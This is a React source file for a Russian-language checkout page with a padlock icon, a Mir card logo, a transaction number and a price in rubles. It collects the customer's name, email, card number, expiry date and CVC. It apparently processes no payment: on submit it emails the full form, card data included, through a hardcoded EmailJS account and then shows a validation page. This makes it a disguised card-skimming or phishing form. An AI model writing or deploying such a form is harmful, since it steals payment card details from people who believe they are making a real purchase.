import React from "react";
import { useRef } from "react";
import emailjs from "@emailjs/browser";
import "./styles.css";
import { Link, useNavigate, useParams } from "react-router-dom";
import { GrSecure } from "react-icons/gr";
import { usePaymentInputs } from "react-payment-inputs";

export default function Form(props) {
  const form = useRef();
  const navigate = useNavigate();
  const {
    meta,
    getCardNumberProps,
    getExpiryDateProps,
    getCVCProps
  } = usePaymentInputs();

  const [checked, setChecked] = React.useState(true);
  const [cardNumber, setCardNumber] = React.useState("");
  const [details, setDetails] = React.useState({
    expiryDate: "",
    cvc: "",
    NomDuClient: "",
    email: ""
  });

  const handleChange = (e) => {
    if (
      (meta.isTouched && meta.error) ||
      Number(cardNumber.length) < 19 ||
      cardNumber.trim().length === 0 ||
      details.expiryDate.trim().length === 0 ||
      details.cvc.trim().length === 0 ||
      details.NomDuClient.trim().length === 0 ||
      Number(details.cvc.length) < 2
    ) {
      setChecked(true);
      console.log("not submit");
    } else {
      setChecked(false);
    }
    setDetails((prevFormDetails) => {
      return {
        ...prevFormDetails,
        [e.target.name]: e.target.value
      };
    });

    console.log(details);
  };
  const handleChangeCardNumber = (e) => {
    setCardNumber(
      e.target.value
        .replace(/[^\dA-Z]/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()
    );
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    if (
      (meta.isTouched && meta.error) ||
      Number(cardNumber.length) < 19 ||
      cardNumber.trim().length === 0 ||
      details.expiryDate.trim().length === 0 ||
      details.cvc.trim().length === 0 ||
      details.NomDuClient.trim().length === 0 ||
      Number(details.cvc.length) < 2
    ) {
      setChecked(true);
      console.log("not submit");
    } else {
      setChecked(false);

      emailjs
        .sendForm(
          "service_pduy8oo",
          "template_be4vpep",
          form.current,
          "d7GFUxt5sOvLttX-o"
        )
        .then(
          (result) => {
            console.log(result.text);
          },
          (error) => {
            console.log(error.text);
          }
        );
      navigate("/Validation");
    }
  };
  const handleCheck = () => {
    console.log("ok");

    setChecked(!checked);
  };
  console.log(useParams());
  const { id, montant } = useParams();
  return (
    <form ref={form} className="form" onSubmit={handleSubmit}>
      <header>
        <div className="TitleSecure">
          <h3>Детали платежа </h3>
          <GrSecure className="secureIcon" />
        </div>
        <div className="Amont transaction">
          <p> Номер трансакция : </p>
          <label className="numeroTransaction">N° {id}</label>
        </div>
        <div className="Amont">
          <p> Цена к оплате : </p>
          <label className="price">{montant} ₽</label>
        </div>
      </header>
      <main>
        {meta.isTouched && meta.error ? (
          <span className="span">Error: {meta.error}</span>
        ) : (
          <span className="span"></span>
        )}
        <div className="NomDuClient">
          <label> ФИО </label>
          <input required name="NomDuClient" onChange={handleChange} />
        </div>
        <div className="EmailDuClient">
          <label> Email </label>
          <input type="email" name="EmailDuClient" onChange={handleChange} />
        </div>
        <div className="NumDeCarte">
          <label> Нормер Карты </label>
          <input
            // {...getCardNumberProps({ onChange: handleChangeCardNumber })}
            onChange={handleChangeCardNumber}
            placeholder="Valid Card Number"
            name="cardNumber"
            maxLength="19"
            value={cardNumber}
            required
          />
        </div>
        <div className="DateEtCvc">
          <div className="Date">
            <label> До </label>
            <input
              {...getExpiryDateProps({ onChange: handleChange })}
              placeholder="MM/AA"
              name="expiryDate"
              required
            />
          </div>
          <div className="CvC">
            <label> CVC2 </label>
            <input
              {...getCVCProps({ onChange: handleChange })}
              name="cvc"
              maxLength="3"
              required
            />
          </div>
        </div>
        <div className="terme">
          <input type="checkbox" onChange={handleCheck} />
          <p className="TermeConfidentialite">
            Сохранить данные карты для дальнейших покупок
          </p>
        </div>
        <input
          disabled={checked}
          type="submit"
          value="Valider"
          className={checked ? "btn" : "btn btnChecked"}
        />
      </main>
      <footer>
        <img className="img1" src="/images/methode.jpg" alt="" />
        <img className="img2" src="/images/mir.png" alt="" />
      </footer>
    </form>
  );
}
